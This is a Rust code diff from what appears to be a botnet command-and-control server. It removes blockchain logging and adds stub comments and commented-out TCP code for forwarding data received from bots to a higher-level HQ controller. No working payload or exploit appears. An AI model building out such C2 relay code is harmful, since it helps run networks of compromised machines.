@@ -34,9 +34,7 @@ use crate::{
     communication::lib,
     encryption as enc,
     message as msg,
-    blockchain::blockchain
 };
-use crate::blockchain::block::Block;
 use super::c2;
 
 const HQ: &str = "127.0.0.1:6969";
@@ -158,8 +156,8 @@ async fn receive_bot_data(
             Ok(mut received_data) => {
                 println!("Received data from channel : {:?} from : {:?}", received_data.B, received_data.ip_address);
                 println!("Sending Data to Commanding C2");
-                // edode : writing to blockchain
-
+                // lisandro : write the code for sending it to HQ
+                //hq_tx.send(received_data);
             },
             Err(err) => {
                 // edode : empty channel
@@ -172,12 +170,23 @@ async fn receive_bot_data(
 #[tokio::main]
 pub async fn main() -> Result<(), Box<dyn Error>> {
 
+/*    println!("Connecting to HQ"); // lisandro : make a function out of it
+    let mut connector = net::TcpStream::connect(HQ);
+    match connector {
+        Ok(mut socket) => {
+            println!("Connected to HQ");
+        },
+        Err(err) => {
+            println!("Could not connect to HQ : {}", err);
+        }
+    };*/
+
     let listener = tokio::net::TcpListener::bind(LOCAL).await?;
     let (chn_bot_tx, mut _chn_bot_rcv) = broadcast::channel(64);
     let (chn_c2_tx, mut _chn_c2_rx) = broadcast::channel(64);
 
     let mut Co: c2::Cohort = c2::Cohort::new();
-    let mut Blk: blockchain::Blockchain = blockchain::Blockchain::new();
+
     // lisandro : make this more generic
     let x = chn_c2_tx.clone();
     thread::spawn(move || {
